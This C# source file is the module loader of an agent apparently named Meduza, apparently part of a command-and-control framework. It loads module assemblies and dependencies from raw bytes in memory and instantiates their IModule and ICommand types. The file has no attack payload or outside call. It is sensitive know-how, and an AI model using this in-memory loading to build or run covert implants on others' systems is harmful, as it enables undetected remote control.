using Meduza.Agent;
using Meduza.Agent.ModuleBase;
using System.Reflection;
using System.Runtime.Loader;

namespace Agent.Core
{
    internal static class ModuleLoader
    {
        /// <summary>
        /// Loads a module and its dependencies from the provided bytes.
        /// </summary>
        /// <param name="moduleBytesModel">The module bytes and dependency bytes.</param>
        /// <returns>The loaded module.</returns>
        internal static IModule Load(ModuleBytesModel moduleBytesModel)
        {
            if (moduleBytesModel.ModuleBytes == null)
            {
                throw new ArgumentNullException(nameof(moduleBytesModel.ModuleBytes), "Module bytes cannot be null.");
            }

            // Create a custom load context for handling dependencies
            var loadContext = new ModuleLoadContext
            {
                AssemblyBytes = moduleBytesModel.ModuleBytes,
                DependencyBytes = moduleBytesModel.DependencyBytes
            };

            // Load the main module assembly and its dependencies
            using (var moduleStream = new MemoryStream(moduleBytesModel.ModuleBytes))
            {
                var assembly = loadContext.LoadFromStream(moduleStream);
                return LoadModule(assembly, loadContext);
            }
        }

        private static IModule LoadModule(Assembly assembly, ModuleLoadContext loadContext)
        {
            // Find a type implementing IModule
            var moduleType = assembly.GetTypes()
                .FirstOrDefault(type =>
                    typeof(IModule).IsAssignableFrom(type) &&
                    !type.IsInterface &&
                    !type.IsAbstract);

            if (moduleType == null)
            {
                string availableTypes = string.Join(",", assembly.GetTypes().Select(t => t.FullName));
                throw new ApplicationException(
                    $"Can't find any type which implements IModule in {assembly.FullName}.\n" +
                    $"Available types: {availableTypes}");
            }

            // Create an instance of the module
            var moduleInstance = Activator.CreateInstance(moduleType);

            if (moduleInstance is not IModule module)
            {
                throw new InvalidCastException(
                    $"Unable to cast object of type '{moduleType.FullName}' to type 'IModule'. Ensure that the IModule interface comes from the same assembly.");
            }

            module.Commands = LoadCommands(assembly).ToList();

            return module;
        }

        private static IEnumerable<ICommand> LoadCommands(Assembly assembly)
        {
            var commandTypes = assembly.GetTypes()
                .Where(type =>
                    typeof(ICommand).IsAssignableFrom(type) &&
                    !type.IsInterface &&
                    !type.IsAbstract)
                .ToList();

            if (commandTypes.Count == 0)
            {
                string availableTypes = string.Join(",", assembly.GetTypes().Select(t => t.FullName));
                throw new ApplicationException(
                    $"Can't find any type which implements ICommand in {assembly.FullName}.\n" +
                    $"Available types: {availableTypes}");
            }

            return commandTypes.Select(type => (ICommand)Activator.CreateInstance(type)!);
        }
    }
}